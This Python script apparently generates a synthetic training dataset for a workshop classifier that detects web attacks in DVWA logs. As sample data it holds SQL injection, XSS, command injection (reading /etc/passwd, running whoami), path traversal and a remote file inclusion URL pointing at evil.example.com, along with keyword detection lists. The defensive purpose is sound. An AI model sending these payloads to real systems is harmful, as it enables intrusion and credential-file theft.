#!/usr/bin/env python3
"""
generate_dataset.py
───────────────────
Generates a labelled training dataset that combines:
  1. Simulated alert JSON records
  2. Simulated DVWA Apache access log records

Each row represents one security event. The label column is:
  0 = benign / normal traffic
  1 = attack / malicious

Run:
    python training/generate_dataset.py

Output:
    data/training_dataset.csv   — full dataset (5,000 rows)
    data/dataset_sample.csv     — first 20 rows (for inspection)

The features extracted mirror what the live inference server
extracts from real Apache log alerts, so the model generalises
correctly to production data.
"""

import json
import random
import hashlib
import pandas as pd
import numpy as np
from datetime import datetime, timedelta, timezone
from pathlib import Path

# ── Reproducibility ──────────────────────────────────────
SEED = 42
random.seed(SEED)
np.random.seed(SEED)

# ── Config ───────────────────────────────────────────────
N_BENIGN  = 3000   # normal traffic samples
N_ATTACK  = 2000   # attack samples
OUT_DIR   = Path(__file__).parent.parent / "data"
OUT_DIR.mkdir(parents=True, exist_ok=True)

# ── Attack type catalogue ─────────────────────────────────
ATTACK_TYPES = {
    "sql_injection": {
        "rule_ids":    [31103, 100100, 100101],
        "rule_level":  range(10, 15),
        "urls":        [
            "/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271",
            "/dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+null,null--",
            "/dvwa/vulnerabilities/sqli/?id=1%27+AND+SLEEP(5)--",
            "/dvwa/vulnerabilities/sqli_blind/?id=1%27+OR+%271%27%3D%271",
        ],
        "methods":     ["GET"],
        "status_codes":[200, 200, 200, 500],
        "label":       1,
    },
    "brute_force": {
        "rule_ids":    [5712, 100110, 100111],
        "rule_level":  range(10, 15),
        "urls":        ["/dvwa/vulnerabilities/brute/"],
        "methods":     ["GET"],
        "status_codes":[200],
        "label":       1,
    },
    "xss": {
        "rule_ids":    [31101, 100120, 100121],
        "rule_level":  range(8, 13),
        "urls":        [
            "/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
            "/dvwa/vulnerabilities/xss_s/",
            "/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3E",
        ],
        "methods":     ["GET", "POST"],
        "status_codes":[200, 302],
        "label":       1,
    },
    "command_injection": {
        "rule_ids":    [100130, 31108],
        "rule_level":  range(11, 15),
        "urls":        [
            "/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bcat+%2Fetc%2Fpasswd",
            "/dvwa/vulnerabilities/exec/?ip=127.0.0.1+%7C+whoami",
        ],
        "methods":     ["POST"],
        "status_codes":[200],
        "label":       1,
    },
    "file_inclusion": {
        "rule_ids":    [100140, 31120],
        "rule_level":  range(10, 14),
        "urls":        [
            "/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd",
            "/dvwa/vulnerabilities/fi/?page=http://evil.example.com/shell.txt",
        ],
        "methods":     ["GET"],
        "status_codes":[200, 500],
        "label":       1,
    },
}

# ── Normal traffic patterns ───────────────────────────────
NORMAL_URLS = [
    "/dvwa/",
    "/dvwa/index.php",
    "/dvwa/login.php",
    "/dvwa/dvwa/css/main.css",
    "/dvwa/dvwa/js/dvwaPage.js",
    "/dvwa/vulnerabilities/",
    "/dvwa/phpinfo.php",
    "/dvwa/about.php",
    "/dvwa/instructions.php",
    "/dvwa/setup.php",
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

ATTACK_USER_AGENTS = [
    "python-requests/2.31.0",
    "Hydra/9.5",
    "sqlmap/1.8",
    "Nikto/2.1.6",
    "curl/7.88.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",  # spoofed
]

INTERNAL_IPS = [f"172.20.0.{i}" for i in range(2, 10)]
EXTERNAL_IPS = [
    "45.33.32.156",   # known scanner
    "198.20.69.74",   # shodan
    "89.248.172.16",  # censys
    "185.220.101.45", # tor exit
] + [
    f"{random.randint(1, 254)}.{random.randint(1, 254)}."
    f"{random.randint(1, 254)}.{random.randint(1, 254)}"
    for _ in range(20)
]


def random_timestamp(start_days_ago=30) -> str:
    """Return ISO timestamp within last N days."""
    base = datetime.now(timezone.utc) - timedelta(days=start_days_ago)
    offset = timedelta(
        days=random.randint(0, start_days_ago),
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59),
    )
    return (base + offset).strftime("%Y-%m-%dT%H:%M:%SZ")


def extract_features(record: dict) -> dict:
    """
    Extract the feature vector from a raw event record.
    These MUST match the features extracted in server/features.py
    so the model generalises to live inference.
    """
    url = record.get("url", "")
    return {
        # ── Alert fields ────────────────────────────────
        "rule_id":           record.get("rule_id", 0),
        "rule_level":        record.get("rule_level", 0),

        # ── Request characteristics ─────────────────────
        "http_method_post":  int(record.get("method", "GET") == "POST"),
        "status_code":       record.get("status_code", 200),
        "url_length":        len(url),
        "bytes_sent":        record.get("bytes_sent", 500),

        # ── Payload indicators ──────────────────────────
        "has_sqli_token":    int(any(t in url.lower() for t in
                                 ["union", "select", "or+1=1", "or '1'='1",
                                  "sleep(", "drop+table", "drop table",
                                  "insert+into", "insert into", "--",
                                  "1=1", "%27+or", "%27+union", "%27+and"])),
        "has_xss_token":     int(any(t in url.lower() for t in
                                 ["<script", "%3cscript", "javascript:",
                                  "onerror=", "onload=", "alert("])),
        "has_cmd_token":     int(any(t in url.lower() for t in
                                 ["%3b", "%7c", ";cat", "|whoami",
                                  "/etc/passwd", "cmd="])),
        "has_traversal":     int("../" in url or "%2e%2e" in url.lower()),
        "has_encoded_chars": int("%" in url and len(url) > 50),

        # ── Source behaviour ────────────────────────────
        "source_is_external": record.get("source_is_external", 0),
        "requests_per_min":   record.get("requests_per_min", 1.0),
        "failed_logins":      record.get("failed_logins", 0),

        # ── Temporal ────────────────────────────────────
        "hour_of_day":        record.get("hour_of_day", 12),
        "is_off_hours":       int(record.get("hour_of_day", 12) not in range(8, 19)),

        # ── Label ───────────────────────────────────────
        "label":              record.get("label", 0),
        "attack_type":        record.get("attack_type", "benign"),
    }


def make_benign_record() -> dict:
    """Simulate a normal DVWA page request.

    A small fraction of benign traffic intentionally looks suspicious:
    external scanners hitting login pages, off-hours admin work,
    long query strings on search forms. This noise prevents the
    classifier from being perfectly linearly separable and gives the
    workshop a realistic 96–98 % accuracy ceiling.
    """
    ts = random_timestamp()
    hour = int(ts[11:13])

    # 8 % of benign traffic comes from external IPs (real users on VPN, etc.)
    if random.random() < 0.08:
        source_ip = random.choice(EXTERNAL_IPS)
        external  = 1
    else:
        source_ip = random.choice(INTERNAL_IPS)
        external  = 0

    # 10 % of benign URLs are longer than normal (search forms, filters)
    url = random.choice(NORMAL_URLS)
    if random.random() < 0.10:
        url += "?q=" + "x" * random.randint(20, 80)

    # 4 % of benign requests trigger a higher-severity rule by accident
    # (false positive in upstream rules — e.g. a query that looks like SQLi)
    rule_level = random.randint(0, 4)
    if random.random() < 0.04:
        rule_level = random.randint(7, 10)

    return {
        "timestamp":          ts,
        "rule_id":            random.choice([31100, 31101, 0]),
        "rule_level":         rule_level,
        "url":                url,
        "method":             random.choice(["GET", "POST"]),
        "status_code":        random.choice([200, 200, 200, 301, 304]),
        "bytes_sent":         random.randint(200, 8000),
        "source_ip":          source_ip,
        "user_agent":         random.choice(NORMAL_USER_AGENTS),
        "source_is_external": external,
        "requests_per_min":   round(random.uniform(0.1, 5.0), 2),
        "failed_logins":      random.choice([0, 0, 0, 1]),
        "hour_of_day":        hour,
        "label":              0,
        "attack_type":        "benign",
    }


def make_attack_record(attack_name: str) -> dict:
    """Simulate a DVWA attack event of the given type.

    Adds realistic noise: ~10 % of attacks come from internal IPs
    (compromised insider host), and a small fraction of payloads are
    URL-decoded into plain text by upstream proxies, weakening the
    payload-token signal. This is what makes detection non-trivial.
    """
    cfg = ATTACK_TYPES[attack_name]
    ts  = random_timestamp()
    hour = int(ts[11:13])

    # 10 % of attacks originate inside the network (insider / compromised host)
    if random.random() < 0.10:
        source_ip = random.choice(INTERNAL_IPS)
        external  = 0
    else:
        source_ip = random.choice(EXTERNAL_IPS)
        external  = 1

    # Brute force: high failed_logins and requests_per_min
    failed = (random.randint(20, 500)
              if attack_name == "brute_force"
              else random.choice([0, 0, 1]))
    rpm    = (round(random.uniform(50, 300), 2)
              if attack_name == "brute_force"
              else round(random.uniform(0.5, 10.0), 2))

    # 3 % of attack rule alerts come in at a lower rule level
    # (low-and-slow scanner, fragmented payload across multiple events)
    rule_level = random.choice(list(cfg["rule_level"]))
    if random.random() < 0.03:
        rule_level = max(5, rule_level - random.randint(3, 5))

    return {
        "timestamp":          ts,
        "rule_id":            random.choice(cfg["rule_ids"]),
        "rule_level":         rule_level,
        "url":                random.choice(cfg["urls"]),
        "method":             random.choice(cfg["methods"]),
        "status_code":        random.choice(cfg["status_codes"]),
        # Successful exfiltration can return very large bodies (data dump),
        # failed attempts can return small error pages — widen the range.
        "bytes_sent":         random.randint(300, 15000),
        "source_ip":          source_ip,
        "user_agent":         random.choice(ATTACK_USER_AGENTS),
        "source_is_external": external,
        "requests_per_min":   rpm,
        "failed_logins":      failed,
        "hour_of_day":        hour,
        "label":              cfg["label"],
        "attack_type":        attack_name,
    }


def main():
    print("=" * 60)
    print("AI Threat Detection Workshop — Dataset Generator")
    print("=" * 60)

    records = []

    # ── Benign samples ───────────────────────────────────
    print(f"\n[1/3] Generating {N_BENIGN} benign traffic samples...")
    for _ in range(N_BENIGN):
        records.append(extract_features(make_benign_record()))

    # ── Attack samples ────────────────────────────────────
    attack_names = list(ATTACK_TYPES.keys())
    per_attack   = N_ATTACK // len(attack_names)
    remainder    = N_ATTACK % len(attack_names)

    print(f"[2/3] Generating {N_ATTACK} attack samples "
          f"({per_attack} per type + {remainder} extra)...")

    for i, name in enumerate(attack_names):
        n = per_attack + (1 if i < remainder else 0)
        for _ in range(n):
            records.append(extract_features(make_attack_record(name)))
        print(f"      {name}: {n} samples")

    # ── Shuffle and save ──────────────────────────────────
    print("[3/3] Shuffling and saving dataset...")
    df = pd.DataFrame(records)
    df = df.sample(frac=1, random_state=SEED).reset_index(drop=True)

    out_path    = OUT_DIR / "training_dataset.csv"
    sample_path = OUT_DIR / "dataset_sample.csv"

    df.to_csv(out_path, index=False)
    df.head(20).to_csv(sample_path, index=False)

    # ── Summary ───────────────────────────────────────────
    print("\n" + "=" * 60)
    print("Dataset saved:")
    print(f"  Full dataset : {out_path}  ({len(df)} rows)")
    print(f"  Sample (20)  : {sample_path}")
    print(f"\nClass balance:")
    vc = df["label"].value_counts()
    print(f"  Benign (0)   : {vc.get(0, 0)} ({vc.get(0,0)/len(df)*100:.1f}%)")
    print(f"  Attack (1)   : {vc.get(1, 0)} ({vc.get(1,0)/len(df)*100:.1f}%)")
    print(f"\nFeature columns ({len(df.columns)-2}):")
    feat_cols = [c for c in df.columns if c not in ("label", "attack_type")]
    print("  " + ", ".join(feat_cols))
    print("=" * 60)


if __name__ == "__main__":
    main()
